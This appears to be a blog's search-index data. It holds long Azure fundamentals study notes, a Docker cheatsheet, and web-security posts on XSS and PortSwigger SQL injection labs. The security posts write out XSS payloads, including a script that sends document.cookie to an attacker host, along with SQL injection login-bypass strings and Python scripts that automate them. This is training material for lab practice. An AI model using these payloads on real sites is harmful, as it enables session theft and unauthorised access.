another region.Resource GroupsLike a logical container for your resources, you can apply various properties to the resource group and those properties apply to all the resources in that resource group, keep in mind these list when create resource group: Lifecycle: All resources should share the same lifecycle for deployment, updates and deletion Resource Assignment: A resource can exist in only one group, but you can add or remove a resource to or from the group as needed. You can also move resources from one group to another. Resource Interaction: resources from different resource groups can interact each other Deletion: When you delete a resource group, all resources in the group are deleted Creation: You can use Azure portal, PowerShell, Azure CLI or an Azure resource manager template to create a resource group Tags: You can apply tags to a resource group to differentiate areas in your organization, the tag applies only to the resource group and not the resources inside the group, think like is only a label of the resource group, however you can put tags in the resources inside A resource group can contain resources from any region, not just the region in which the resource group is locatedAzure SubscriptionA resource group serves as a logical container for resources, Azure Subscriptions serves the same but a higher level, like a box that contains all your resource group boxes, also a resource group only exist in one subscription.Azure Subscriptions can serve as: Administrative boundaries (control security, resources and policies) Payment Agreement, ex: pay-as-you-go offer tied to a credit card billing each month Legal Agreement with specific Azure plan, each with its own rate plan, terms and conditions ex: free trialManagement Groups Useful for managing access, policies and compliance for your subscriptions Level of scope above subscriptions Use case: limit regions available for VMs creationsHierarchy of management groups and subscriptionsResource Manager Everything in azure is a resource (vm,db,etc..) Useful for manage resources, serving as a deployment service for azure ARM support use of templates to create, manage resources in JSON format You can automate the deployment of an entire Azure environment by using templates, only need to declare what you want to create and the properties, and the ARM passes that information to Azure providersCore Azure ServicesVirtual Machines (IaaS) Full control over OS Maintain and patch VM image Has scalability, flexibility You can move from host to host due to the metadata that defines the VMVirtual machine scale sets Simplify the creation and managing a group of load-balanced VMs Scale in or scale out to adjust the demand Enables high availability in themselves (up to 1000 VMs or 600 custom images) Created from the same OS image (same applications and config) You can use AZs to further improve availability by distributing the VMs across multiple data centersAvailability Set Help avoid potential outages caused by hardware issues and update VMs without causing the set to be unavailable Fault Domain: Group of hardware that shares a power source and network switch, similar to a rack Update Domain: Group of hardware thar undergoes maintenance activities or reboot events at the same time Availability sets distributes VMs across multiple fault domains and update domains Azure App Service PaaS Service that enables quickly develop and deploy web apps Support .net, java, ruby, python, etc.. and Windows or Linux OS and docker containers Offers load balancing, autoscaling, automated management(updates), security features and templates from MarketplaceAzure Container Instances (ACI) Offers the fastest and simples way to run a container in Azure is a PaaS service where you upload your container and runs for you Cost saving because you are only paying for consumption of CPU and memory used by container, rather than paying a VM Serves as a virtual environment that includes the resources necessary for its hosted application to function Designed to be created, scaled out and stopped dynamicallyAzure Kubernetes Service (AKS) AKS is a container orchestration service that monitors health Provides scalability and resource sharing among container in a Kubernetes cluster This service is a complete orchestration for containers with distributed architectures and large volume, can use the same image for deployingWindows Virtual Desktop (WVD) Enables your users to use a cloud-hosted version of Windows from any location Azure Virtual Desktop works across devices like Windows, Mac, iOS, Android, and Linux Good for users working from home, rather than provision a new Windows device Provide best user experience, enhance security, simplified management performance management and multi-session win 10 enterprise deploymentCore Azure StorageBlob Storage Optimized to store large amount of unstructured data Accessed through HTTP or HTTPS, Azure Storage API, Azure Powershell, Azure CLI or Azure storage client library Similar to S3 from Amazon Web Services Tiers: Hot access: Optimized for storing frequently accessed data Cool access: Optimized for data you access infrequently or for a relatively limited period of time Archive access: Data that you rarely access, ex:long-term storage backups Hot an cool stores data online, but cool means lowe storage cost but higher access costDisk Storage Attached to a VM, like a physical disk in a server, 99.999 availability through replicas Offer three main types: data disk, OS disk and temporary disk OS and data disks are persistent, they don’t go when you reboot your VM Support server-side-encryption and disk encryption Server-side-encryption is enabled by default with bitlocker(Windows) and DM-Crypt(Linux), meet compliance and policy requirements Disk encryption enables you to encrypt OS and data disksFile Storage Files that are available from anywhere in the world but not associated with a VM or volume letter Can be accessed by Server Massage Block (SMB) or Network File System (NFS) Used for replacing existing data on premise file servers, moving data from on-premise to Azure and sharing data required by appsStorage Accounts Before you use storage in Azure you must create an storage account, this account provides an unique name through which you can access these objects via HTTP or HTTPS Types of account: General-purpose v1: Legacy account type intended for blobs, files, queues and tables General-purpose v2: Intended for blobs, files, queues as well as Data lake Gen2 BlockBlobStorage: Intended for block blobs and append blocs in high-performance such as high transaction rates and for low latency FileStorage: Intended for files-only storage scenarios where premium performance is required BlobStorage: Legacy blob-only storage account type Core Data ServicesSQL Server on Azure VMs Good for fast migration of SQL server from on-premise to Azure with retention of operating system access Enables lift-and-shift from an on-premise datacenter to Azure with ease, while maintaining compatibilityAzure SQL Database You should use this solution for Cost-effective, serverless database with an intermittent usage pattern and a low compute utilization over time Abstracts all the infrastructure needed to host a SQL database Is a PaaS in which Microsoft manages maintenance like upgrades, patching and monitoring to ensure 99.99 uptime You only focus on creating the SQL database and managing tables, views, etcAzure SQL Managed Instances Is a PaaS service that provides scalable cloud data service without need to deploy hardware Enables frictionless migration to Azure with minimal application and database changes, at the same time it eliminates overhead for the management of underlying infrastructure Differences with azure SQL SQL MI offers features for auditing, authentication, backups, change data capture (CDC) common languaGe runtime (CLR) linked servers, OPENQUERY… Can integrate with the Azure Data Migration Server, enable easy move from on-premise to Azure managed instanceCosmos DB Multimodel Database: scale data out to multiple Azure regions in the globe Provides excellent elasticity in both throughput and storage, good for peak hours Supports SQL and NoSQL databases like MongoDB, Cassandra, Gremlin API (massive graphs)Azure Database for MySQL Serverless service, only focus on your MySQL databases without worrying about the infrastructure If you see the LAMP (Linux, Apache, MySQL, PHP) stack for development in the exam think about MySQLAzure Database for PostgreSQL PaaS service, support PostgreSQL database engine with scalability, elasticity, high availability and more PostgreSQL is appropriate in situations where you want to deploy and manage PostgreSQL databases without worrying about underlying infrastructureAzure Database Migration Service Supports variety of database migrating scenarios for offline and online migrations Offline occurs when the resource is not in use In an online migration the data is synchronized from the live source to the target and then the app is cut over the new instance of the databaseCore Networking ServicesVirtual Networks VNet enables virtual machines and other services to communicate among themselves, with the internet and with your on-premise network VNets adds availability and scalability to your network resources in Azure When you create a VNet you specify the private IP adress space that the VNet will use VNets are scoped to a single region and subscription but span in all AZs in each region You can use virtual network peering to connect VNet across regions with the same latency if they where on the same virtual networkLoad Balancers Distribute network traffic across multiple resources to improve responsiveness, reliability and availability Azure offer four load balancing services: Azure Front Door: Designed for global or multiregion routing and site acceleration, uses the Microsoft global edge network to enable fast, secure and scalable web applications Support URL path based like application gateway, but this is globally distributed (caching, high availability, fast failover) Azure Traffic Manager: Is an application layer DNS-based traffic that balances traffic at the domain level across global Azure regions, offers options for routing and detecting point health Appropriate for DNS-based global routing, detecting endpoint health and routes traffic to the data center closest to the users Azure Application Gateway: Provides application delivery controller (ADC) as a service, applicable for HTTPS traffic and can route traffic based on incoming URL, URI path, and host headers Good for HTTP(S) traffic, for example when the URL includes videos in the path and you want to direct traffic to a set of web servers Azure Load Balancer Is a transport layer service designed for high performance and low latency, support zone-redundant and applies for non HTTP(S) traffic Good for balancing traffic among multiple database VMs Azure VPN Gateway VPN establishes an encrypted tunnel between two private networks across public network For example: you can establish a secure connection between your on-premise network and your resources in azure Supports multiple VPN configurations: Site-to-site: Establishes a VPN between two sites, such as between your on premise data center and azure Multi-site: Establishes VPN tunnels between azure and multiple on-premise sites Point-to-site: Establishes a VPN tunnel from a single device (point) to a site VNet-to-VNet: Establish a VPN between two Azure VNets ExpressRoute Create private connection between Azure Datacenters and infrastructure on premise (cost saving) Don’t go over the public internet, and offer more reliability, faster speeds, and lower latencies than typical internet connectionsContent Delivery Networks (CDN) Places web content across networks to make readily available to users on their location Example: If a user in USA want to see a video that you host in Italy, you could place those files in CDN that has a point of presence in Virginia, when the user access this file, the file come from the cached copies in the CDN, rather than your server in Italy Each file has a time-to-live (TTL) property that determines when the file should be refreshed from the source to the cacheSummary Networking Addressing: Devices on a network are assigned a network address, subnets create virtual networks to segregate devices within an address space, when you create a resource you specify the address segment and the IP (static or dynamic) Routing: Routers move network traffic between network segments, make possible to communicate between public networks and private networks with public ones Domain Name Service (DNS): Provides a hots-to-address resolution, enabling application to determine the IP address associated with a hostname Virtual Private Network: Creates an encrypted tunnel between two private networks across public networks Load Balancer: Distributes traffic to a group of servers or services, enabling the load to be shared among them, and enables fault tolerance Express Route: Establish a secure VPN connection bypassing the internet, connects directly to the Microsoft global network Content Delivery Network (CDN): CDN places content near users and reduce network traffic and latencyCore Solutions and Management ToolsInternet of Things (IoT)Azure IoT Hub Azure-hosted service that server as message hub between IoT devices and Azure services Requires you to write code to connect IoT devices Supports multiple protocols, SDK, highly scalable which means it can integrate billions of devices Support multiple communication and control functions, including: Device-to-cloud telemetry to collect data Device-to-cloud file upload to collect and transfer data Request/reply methods for controlling devices from the cloud Monitoring IoT hub can route messages received to other Azure services Can not support analyzing of telemetry dataAzure IoT Central SaaS solution to build IoT solutions without development expertise Builds on the functions provides by IoT Hub to provide dashboards for control, management features You can connect new devices, view telemetry, view overall device and create alerts to notify you You can use device templates, which allow you to connect new devices without any coding in IoT central This solution supports device-to-cloud messaging and per-devide identityAzure Sphere Integrated IoT solution that consist of three key parts: Azure Sphere micro controller unit (MCUs): Hardware component built in the IoT device Management software: Custom linux OS that manages communication with security service Azure Sphere Security Service (AS3): Handles certificate-based device auth to Azure, updates the software to prevent vulnerabilities in the device Data AnalyticsData Lake Analytics Big Data solutions that allows developers to write code with a mixture of SQL and C# syntax, the language is called U-SQL Allows developers to user their existing skills to process data a large-scale Azure Synapse Analytics Good if you are looking for distributed query solution, that works with machine learning Offers serverless and dedicated resource model, requires the use of five different application components which forms an Azure Synapse clusterHDInsight Managed Apache Hadoop service that lets you run Apache Spark, Hive, Kafka, HBase and more (big data) Makes ease, fast and cost effective to process massive amounts of data in a customizable environment Some of its capabilities are: Cloud Native Low-cost and scalable Secure and Compliant Monitoring Global, productivity Azure Databricks Is an Apache Spark based analytics platform designed to provide collaborative analytics workflow Data analytics platform optimized for Azure, offers three environments for developing apps: Databricks SQL: easy-to-use platform, run SQL queries on their data lake, build and share dashboards Databricks Data Science &amp;amp; Engineering: enables collaboration, for big data pipelines, can work with apache kafka and IoT hub, Spark Databricks Machine Learning: integrated end-to-end ML environment with managed services for experiment tracking, model training, feature development and model serving Azure Event Hub PaaS service offering that can ingest and process millions of events per second from websites, mobile apps, and IoT devices It can be part of big data streaming or feed a real time analytics solutionAzure Stream Analytics PaaS solution designed to process high volumes of fast streamed data from sources like sensors, IoT devices and apps Identify patterns and relationships in the streamed data to trigger actions, initiate workflows, feed reporting tools and redirect data to storage solutions Artificial Intelligence Azure Machine Learning Through testing you determine the model that provide the most accurate predictions Can use Machine Learning Studio (portal web) for create no-code solutions using a selection of tools (drag-and-drop), also manage assets and resources You should use Machine Learning service when you want to create machine learning algorithms by using python, there are thousands of open-source Python packages with machine learning components Machine Learning Studio allows you to use built-in algorithms, not write custom algorithm in pythonAzure Cognitive Services Provide ML models designed to interact with humans and execute cognitive function that humans would normally do, the following list summarizes the services: Language: To process natural language to determine, for ex: the user question or sentiment Speech: Convert speech into text or text into speech, can translate one language to another, recognize and verify the speaker Vision: Provides identification for analyzing images, videos and similar visual data Decision: Personalize user experience with recommendations, remove offensive content… Azure Bot Service Enables you to create virtual agents to interact with users Answer questions, get information and start activities with other azure services Can use all the cognitive services to do activities like understand what user is askingAzure Marketplace Provides purchase and subscriptions links to certified cloud applications and solutions from Microsoft and its technology partners All solutions offered are certified through the Microsoft Azure Certification Program This ensures compatibility with the Azure public cloud Offerings include: API applications Azure AD applications Data services Developer Services VMs and Web apps Serverless Computing Azure Function If you used AWS, is similar to Lambda function, enables you to host a single method that runs in response to an event You can use different programming languages to code this function Scales automatically, pay only for the time and resources needed while function is running Is stateless, does not store it state from every execution, executes the same every time Excellent solution for building small blocks of code that run for a very short time in response to an eventAzure Logic Apps More complex than a function, like a workflow, create no-code and low-code solutions to automate and orchestrate tasks, business processes and workflows Build the apps using web-based design environment by connecting triggers to actions with various connections, ex: a message arriving a queue is a trigger, this event pass the massage to other service Priced based on the number of executions and the type of connectors that the app usesAzure Event Grid Provides solution for building event-driven architectures that subscribe to Azure resources and route events for different endpoints Event grid can subscribe to a variety of Azure resources including storage resources, resource groups and IoT Hubs Events can be filtered before being forwarded to appropriate event handlers for processingDevOpsAzure DevOps Services Is a group of services that enables and support multiple stages in development process, include the following: Azure Artifacts: Repository for storing development artifacts such as compiled source code Azure Boards: Manage individuals items, task, features and bugs Azure Pipelines: Automatically build and test code projects Azure Repos: Source code repository for collaborating on development projects Azure Test Plans: Automated testing tool for code Github Actions Offers many of the same functions as Azure DevOps Github is the appropriate choice for collaborating on open source projects and DevOps is the appropriate choice for enterprise/internal projectsAzure DevTest Labs Automates deployment, configuration and decommissioning of VMs and Azure resources You can decommission all those services so that you pay only for the resources you need for testing while your are testing them Can use ARM templates to deploy any type of resource, however DevTest Labs does not provide monitoring, alerting or telemetry services to monitor those resourcesAzure Management ToolsAzure Portal Web interface that enables you ti view, create and manage Azure resources and services Easy to use because it offers a familiar web-based user experience, also provides a wealth of visualization tools and reports You can encounter dashboards, blade or resource panel A blade is a panel that slides out in a navigation sequence, it represents a single level navigation hierarchy, each blade provides either information or configuration option A dashboard is a collection of customizable tiles that are displayed in the portal, you can add remove and reposition tiles as you wish A resource panel is the left-most panel in the portal, is lists the main resource types that are available Azure PowerShell Scripting environment to execute commands to perform management tasks in Azure through Azure REST API Those scripts can be simple or complex, potentially deploying hundreds of resources in short period You can access powershell through Azure Cloud shellAzure CLI If you are experienced with Bash, this is your best option, is a driven scripting environment that also uses REST API You can access via web browser through the Azure Cloud ShellAzure Cloud Shell Web based interface that enables you to run Azure PowerShell, Bash and Azure CLI commands and scripts A storage account is required to use Azure Cloud ShellAzure Mobile App Enables you to manage Azure resources from your mobile device Is not great management solution for complex tasks, but you can do basic functions with your apps like reset a web appAzure Advisor Personalized cloud consultant that helps you follow best practices to optimize your Azure deployments Analyzes your resource configuration and usage telemetry to give the best recommendations Gives you recommendation based on: Operational Excellence Security Reliability Performance efficiency Cost Optimization Azure Monitor Helps you maximize the availability and performance of your apps and services Collect, analyze and acting on telemetry from your cloud and on-premise environments to understand how your apps are performing and identify issues affecting them and the resources they depend on With Azure Monitor you can: Detect issues across applications and dependencies Drill into your monitoring data for troubleshooting Create visualizations with azure dashboards Create actions that execute automatically in response to alerts Azure Service Health Keep you informed about the health of your cloud resources Include current and upcoming issues such as service impacting events, planned maintenance, … Combination of three separate smaller services Status page: Provides information on Azure services globally to help you see at a glance what services are affected in what regions Service Health: Gives you information about service issues, planned maintenance, health advisories, and security advisories in a dashboard Resource Health: Tracks the state of the resources you have deployed to Azure to give you visibility to any ongoing or historical issues with those resources General and Network SecurityAzure SecurityAzure Security CenterMonitoring service that provides threat protection across both azure and on-premise datacenters Support Windows and Linux OS Integrates natively with Microsoft Defender to provide risk detection and assessment with threat intelligence Provide security recommendations Detect and block malware Analyze and identify potential attacks Just-in-time access control for ports Capabilities: Policy Compliance Continuous assessments Tailored recommendations Threat protection Azure Sentinel Security information management (SIEM) and security automated response (SOAR) solution that provides security analytics and threat intelligence across an enterprise A playbook is a collection of procedures that can be run from Azure Sentinel in response to an alert A security playbook can help automate and orchestrate your response, and can be run manually or set to run automatically when alerts are triggered Playbooks can be used to sync you Microsoft Sentinel incidents with other ticketing system Connector and Integrations: Ofiice 365 Azure Active Directory Azure Advances Threat Protection Azure Key VaultStores application secrets in a centralized cloud location to securely control access permission and access logging Securely store cryptographic keys and other secrets Secret management Key management Certificate management Storing secrets backed by hardware security modules (HSMs)Azure Dedicated HostProvides physical servers that host one or more Azure virtual machines that is dedicated to a single organizations workload Hardware isolation at the server level Control over maintenance event timing Aligned with Azure Hybrid Use BenefitsNetwork SecurityDefense in depth Layered approach to securing computer system Provides multiple levels of protection Attacks against one layer are isolated from subsequent layers Combining network security solutions to maximize the defenseNetwork Security Groups (NSG)Filter network traffic to and from Azure resources on Azure Virtual Networks Set inbound and outbound rules to filter by source and destination IP address, port, and protocol Add multiple rules, as needed, within subscription limits Azure appliesApplication Security Groups (ASG) Enable you to group servers based on applications running on them and manage security for them as a group Rather than apply rules in the NSG to the VMs where applicaction servers reside, you create a ASG and add VMs to it, and then create the NSG and reference the ASG in it The NSG rules then apply to the VMs in the ASG Azure Firewall A stateful, managed Firewall as a Service (FaaS) that grants/denies server access based on IP address, in order to protect network resources in the perimeter layer Applies inbound and outbound traffic filtering rules Built-in high availability Unrestricted cloud scalability Uses Azure Monitor loggingAzure Distributed Denial of Service (DDoS) protectionDDoS attacks overwhelm and exhaust network resources, making apps slow or unresponsive Sanitizes unwanted network traffic before it impacts service availability Basic service tier is automatically enabled in azure Standard service tier adds mitigation capabilities that are tuned to protect Azure Virtual Network resourcesIdentity, Governance, Privacy and ComplianceAzure IdentityCompare Authentication and AuthorizationAuthentication: Identifies the person or service seeking access to a resource Requests legitimate access credentials Basis for creating secure identity and access control principles Can use certificates to identify a person or serviceAuthorization: Determine an authenticated person or service level of access Defines which data they can access, and what they can do with it Can not use passwords to identify a personAzure Multi-Factor AuthenticationProvides additional security for your identities by requering two or more elements for full authentication Something you know (password, pin) Something you possess (phone, key) Something you are (biometric control)Azure Active Directory (AAD)Is Cloud bases identity and access management service Authentication (employees sign-in to access resources) Single sing-on (SSO) Application management Business to Business (B2B) Business to Customer (B2C) identity services Device managements Plans: Azure AD Free: Provides management of users and groups, synchronization with on-premises AD, basic reporting, SSO, Microsoft 365 Azure AD Premium P1: Includes all features in free along with the capability to access on-premise resources, support dynamic groups, self-service group management, Microsoft Identity Manager Azure AD Premium P2: All the P1 features along with Azure AD Identity protection for conditional access to apps and critical data, and Privileged Identity Management for discover, monitor, restrict access to resources Can integrate with RBAC to control who has access to specific Azure Resources, what actions they can take and what areas they can access To use RBAC in azure, you create a role assignment that consists of a security principal, role definition and scope Security Principal=who, Role=what, and Scope=where Conditional Access Is used by Azure Active Directory to bring signals together, to make decisions and enforce organizational policies User or Group Memberships IP Location Device Application Risk DetectionAzure GovernanceExplore Role-based access control (RBAC) Fine-grained access management Segregate duties within the team and grant only the amount of access to users that they need to perform their jobs Enables access to the Azure portal and controlling access to resourcesResource Locks Protect your Azure resources from accidental deletion or modification Locks can not be applied to specific users or roles, it applies to all users and roles Manage locks at subscription, resource group, or individual resource levels within Azure Portal Two Types: CanNotDelete ( You can read, update but not delete) ReadOnly ( You can read, but not update or delete) Tags Provides metadata for your Azure resources Useful to differentiate areas in your company Up to 50 tag per resource by defaultAzure PolicyHelps to enforce organizational standards and to access compliance at-scale. Provides governance and resource consistency with regulatory compliance, security, cost, and management Evaluates and identifies Azure resources that do not comply with your policies Provides built-in policy and initiative definitions, under categories such as Storage, Networking, Compute, Security Center, and MonitoringAzure Policy Initiative Is a collection of Azure policies definitions, usually grouped with the aim of achieving a single goal Initiatives are used to simplify managing and assigning policies When a initiative assignment is evaluated, all policies in that initiative are evaluated An initiative can only contain policies that area located in the same subscription, however you can assign a single initiative to scopes across multiple subscriptions or management groups Azure Blueprints Makes it possible for development teams to rapidly build and stand up new environments. Developments team can quickly build trust through organizational compliance with a set of built-in components (such as networking) in order to speed up development and delivery When a blueprint is updated and the updated version is published, any assignments of the blueprint are not updated automatically When a blueprint is unassigned, all resources assigned by the blueprint remain in place, but blueprint resource locking is removed, this results int the deletion of the blueprint assignment object When you delete a core blueprint, any assigned versions of the blueprint remain in place, a blueprint must be unassigned before it can be deleted Role Assignments Policy Assignments Azure Resource Manager Templates Resource GroupsCloud Adoption Framework The one Microsoft approach to cloud adoption in Azure Best practices from Microsoft employees, partners and customers Tools, guidance, and narratives for strategies and outcomes Strategy: Define the business justification and the expected outcomes of adoption Plan: Align actionable adoption plans with business outcomes Ready: Prepare the cloud environment for the planned changes Develop new cloud-native or hybrid solutionsAzure ComplianceSecurity, Privacy and Compliance Security: Secure by design. With built in intelligent security, Microsoft helps to protect against known and unknown cyberthreats, using automation and artificial intelligence Privacy: We are committed to ensuring the privacy of organizations through our contractual agreements, and by providing user control and transparency Compliance: We respect local laws and regulations and provide comprehensive coverage of compliance offeringsOnline Service Terms and Data Protection Addendum Online Service Terms: The licensing terms define the terms and conditions for the products and Online Services you purchase through Microsoft Volume Licensing programs Data Protection Addendum: The DPA sets forth the obligations, with respect to the processing and security of Customer Data and Personal Data, in connection with the Online ServicesAzure Pricing and SLAPlanning and managing costsFactors affecting costsThere are six primary factors affecting costs Resource type Services: Azure usage rates and billings can differ between Enterprise, Web Direct, and CSP customers Location Bandwidth: inbound data is free, but outbound is priced based on zones Reserved Instances: reservations reduce your resource costs up to 72% on pay-as-you-go prices Azure Hybrid Use Benefit: For customers with Software Assurance, you can use your licenses on Azure to reduce costsPricing Calculator You can estimate the total costs of the services your are willing to use You only need to select the resource and specify the parameters like region, OS, tier, time You can export, save or share the price for the solutionTotal Cost Ownership Calculator (TCO) A tool to estimate cost saving you can realize by migrating to Azure A report compares the costs of on-premises infrastructures with the costs of on-premises infrastructures with the costs of using Azure products and services in the cloudAzure Cost Managements Reporting billing reports Data enrichment Budgets - set spend budget Alerting - when costs exceed limits Recommendation - cost recommendationsAzure SLAs and Service LifecycleService Level Agreements (SLAs) describes Microsoft commitments for uptime and connectivity SLAs are based on individual products and servicesSLAs for Azure products and services Performance targets are expressed as uptime and connectivity guarantees Performance-targets range from 99% to 99.999% If a service fails to meet the guarantees, a percentage of the monthly bill can be refoundedComposite SLAs Is the result of combining services with potentially differing SLAs, for example VMs and Azure SQL Database, one with 99.9 percent and the other with 99.99 percent, to determine the composite SLA, you simply multiply the SLA values for each resourceActions that affect SLAsLower you SLA: Adding more services Choosing free or non-SLA servicesRaise your SLA: Availability Zones Redundant systemsMany factors can raise or lower your SLA, design decisions based on business goals will drive your SLA goalsService LifecyclesDetermines how a product is released and supported, azure provides two lifecycle phases: preview and general availabilityAzure Preview Program Azure features in the preview phase (beta testing) Preview features are not subject to SLAs and the limited warranty outlined in the Online service terms In general public previews are available to everyone, in some cases Microsoft offer private previews to selected organizations by invitation Can be configured at the organization or user level General Availability The next step is general availability, these services are subject to the published SLAs and other service terms and warranties defined by the Online Service Terms Moving the GA does not guarantee that a service will always be offered Azure provides for a minimum of 12 months notice before a GA feature is retired" }, { "title": "Cross-site scripting (XSS)", "url": "/posts/Cross-site-scripting-(XSS)/", "categories": "Web Security, Portswigger Academy", "tags": "web security, theory, owasp, xss", "date": "2022-02-14 11:00:00 -0500", "snippet": "Cross-site scripting known as XSS is a web vulnerability in which malicious scripts are injected int benign and trusted websites. XSS occur when an attacker send malicious code in any user input fields in a browser to a different end-user.MechanismsIn an XSS attack the attacker inject script in HTML code so you’ll have to know javascript and HTML syntax, wbe uses scripts to control client-side application logic and make the website interactive, for example this script generates Hello! pop-up on the web page:&amp;lt;html&amp;gt; &amp;lt;script&amp;gt;alert(&quot;Hello!&quot;);&amp;lt;/script&amp;gt; &amp;lt;h1&amp;gt;Welcome to my page&amp;lt;/h1&amp;gt;&amp;lt;html&amp;gt;Script like this that are embedded in HTML file instead of loaded from are separated file are called inline scripts. These script causes XSS vulnerabilities, scripts can also be loaded from an external file like this: &amp;lt;script src=&quot;URL_OF_EXTERNAL_FILE&quot;&amp;gt;&amp;lt;/script&amp;gt;If the website doesn’t validate the input before render the message, it will cause XSS, validating user input means that the application checks that the user input meets a certain standard, sanitizing in the other hand means that the application modifies special characters in the input that can be used to interfere with HTML logic before further processing.As a result the inline script will cause a redirection to an another url. The src attribute of HTML script tag allwo to load javascript form external source, this code will execute the content of https://attacker.om/xss.js/ on the victim browser:&amp;lt;script src=http://attacker.com/xss.js&amp;gt;&amp;lt;/script&amp;gt;This example is not exploitable because there is no way of inject this in other users pages, but let´s say the site allow users to subscribe to a newsletter with the URL https://subscribe.com?email?=USER_EMAIL after the user visit this page, they are automatically subscribed, and the confirmation message will appear on the web, so we can inject xss payload for users who visit this URL https://subscribe,com?email=&amp;lt;script&amp;gt;location=&quot;http://attacker.com&quot;;&amp;lt;/script&amp;gt; since the malicious script is incorporated in the page, the user will think its safe, so we can access any resources that the browser stores for that site, for example this code will steal user cookies by sending a request to the attacker IP.&amp;lt;script&amp;gt;image=new Image();image.src=&#39;http://atttacker_site_ip/?c=&#39;+document.cookie;&amp;lt;/script&amp;gt;Reflected XSSInput from a user is directly returned to the browser, permitting injection of arbitrary contentA classic example would be a URL, which contain a parameter that can be altered by a user, where the input is mirrored and made visible.Example URL: ‘https://example.com/?user=jesus’Example Output:&amp;lt;span id=&#39;user&#39;&amp;gt; &amp;lt;b&amp;gt; Hi jesus&amp;lt;/b&amp;gt;&amp;lt;/span&amp;gt;Stored XSSInput from a user is stored on the server (database) and returned later without proper escaping and sanitization to the userDOM XSSInput from a user is inserted into the page’s DOM without proper handling, enabling insertion of arbitrary nodesRecognition for XSS Figure out where it goes, embedded in a tag attr or embedded in a script? Figure out how special characters are handled: A good way is to input something like &amp;lt; &amp;gt; &#39; &quot; { } ; : &quot;&amp;gt;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt; &#39;+alert(1)+&#39; &quot;onmouseover=&quot;alert(1) http://onmouseover=&quot;alert(1)" }, { "title": "Docker Cheatsheet", "url": "/posts/Docker-Cheatsheet/", "categories": "DevOps, Docker", "tags": "cheatsheet, docker", "date": "2022-01-27 00:00:00 -0500", "snippet": "“With Docker, developers can build any app in any language using any toolchain. “Dockerized” apps are completely portable and can run anywhere - colleagues” OS X and Windows laptops, QA servers running Ubuntu in the cloud, and production data center VMs running Red Hat.Basic CommandsVerified cli can talk to enginedocker versionMost config values of enginedocker infodocker ps #see al docker runningdocker top &amp;lt;name&amp;gt; #see info about the containerDocker command line structuredocker &amp;lt;command&amp;gt; (options) #old (still works)docker &amp;lt;command&amp;gt; &amp;lt;sub-command&amp;gt; (options) #newDeploy a nginx serverdocker container run --publish 80:80 nginxList all container runningdocker container ls &amp;lt;options&amp;gt; Syntax Description –all, -a Show all containers (default show running) –filter, -f Filter output based on conditions –format Pretty-print containers using Go templates –last, -n Show n last creates containers –latest, -l Show the latest created container –no-trunc Dont truncate output –quiet, -q Only display container ids –size, -s Display total file sizes Stop the container process but not remove itdocker container stop &amp;lt;id&amp;gt;Assign a name to a containerdocker container run --publish 80:80 --name webhost nginxShow logs for a specific containerdocker container logs Remove many containers togetherdocker container rm &amp;lt;id&amp;gt; &amp;lt;id&amp;gt; &amp;lt;id&amp;gt; -f #use f for stop the container before" }, { "title": "SQL Injection - Labs", "url": "/posts/SQL-Injection-Labs/", "categories": "Web Security, Portswigger Academy", "tags": "web security, labs, owasp, sqli", "date": "2022-01-25 11:00:00 -0500", "snippet": "Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden dataWe need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloadsWe can see that the request is filtering the data by category, and we are asked to show the hidden elements, so we assume that there is a parameter that hides the elements.We try the following payload that will show the elements of all categories and we will comment out the rest of the query so that it does not filter by hidden or visible elements:SELECT * FROM products WHERE category=&#39;Tech gifts&#39;or 1=1--This payload will comment everything else from the query, so it will show us all the elements, released or unreleased.With this we can see the hidden data and finish the lab.Lab 1 Python ScriptWith this script the sql injection process is done automatically based on the fact that we already know the manual output, in this case we verify that the object “3D Voice Assistant” is in the web response and don´t forget to set the proxies.import requestsimport sysimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}def exploit_sqli(url, payload): uri=&#39;/filter?category=&#39; r=requests.get(url+uri+payload,verify=False, proxies=proxies) if &#39;3D Voice Assistants&#39; in r.text: return True else: return False if __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = sys.argv[2].strip() except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt; &amp;lt;payload&amp;gt;&#39; % sys.argv[0]) print(&#39;Example: %s www.example-com &quot;1=1&quot;&#39; % sys.argv[0]) sys.exit(-1) if exploit_sqli(url,payload): print(&quot;SQL Injection Successfull&quot;) else: print(&quot;Injection Failed, try again&quot;)Lab 2 - SQL injection vulnerability allowing login bypassIn this lab we will use the same idea as in the first lab, we will discuss the validation of the password in the query to let us log in as administrator with only the username with this payload admnistrator&#39;-- and the query would look like this:SELECT * FROM users WHERE username=&#39;administrator&#39;--&#39; and password=&#39;something&#39;This payload will comment the password validation and only will verify the correct username, in this case they give us this hint.Lab 2 Python ScriptWith this script the sql injection process is done automatically based on the fact that we already know the manual output, in this case we verify that the object “3D Voice Assistant” is in the web response and don´t forget to set the proxies.import requestsimport sysimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}a_session = requests.Session()def exploit_sqli(url, payload): uri=&#39;/login&#39; r=a_session.post(url+uri, data={&#39;username&#39;:payload, &#39;password&#39;:&#39;a&#39;, &#39;csrf&#39;:&#39;EDWeHPACH8bS0tDjAm7gCWzRdGPPYdGT&#39;},verify=False, proxies=proxies, cookies={&#39;session&#39;:&#39;mnSlrxs2JjbmuE7icjEsJHJKgswWnkA5&#39;}) if &#39;Log out&#39; in r.text: return True else: return False if __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = sys.argv[2].strip() except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt; &amp;lt;payload&amp;gt;&#39; % sys.argv[0]) print(&#39;Example: %s www.example-com &quot;1=1&quot;&#39; % sys.argv[0]) sys.exit(-1) if exploit_sqli(url,payload): print(&quot;SQL Injection Successfull&quot;) else: print(&quot;Injection Failed, try again&quot;) For this script to work we need the session cookie and the csrf token that we get by intercepting the post with burpsuite.Lab 3 - SQL injection UNION attack, determining the number of columns returned by the queryIn this lab we have to find out the number of columns that has the table of objects displayed on the web, in this case is filtering by category, but we will use UNION and NULL VALUES to determine how many columns exist, for that we will use as an example UNION SELECT NULL, 